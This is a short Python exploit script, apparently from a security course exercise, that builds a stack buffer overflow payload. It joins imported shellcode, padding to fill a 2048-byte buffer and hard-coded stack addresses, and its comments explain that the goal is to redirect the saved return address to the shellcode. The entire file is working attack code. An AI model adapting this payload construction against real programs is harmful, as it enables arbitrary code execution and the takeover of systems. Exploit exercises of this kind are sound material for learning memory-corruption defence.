#!/usr/bin/env python3

import sys

from shellcode import shellcode
buf_addr = 0x7ffffff6acc0  
rbp_address = 0x7ffffff6b4d0
buffer_length = 2048

#set p tp point to where the return address is stored 
#make a equal the value of where the shellcode starts 
#then the *p = a will change the value of the return address
#return address is stored above the rbp 

payload = shellcode 
payload += b'A' * (buffer_length - len(shellcode)) #distance to the return address in memory fill with padding
payload += buf_addr.to_bytes(8, 'little')
payload += (rbp_address+8).to_bytes(8,'little')
sys.stdout.buffer.write(payload)
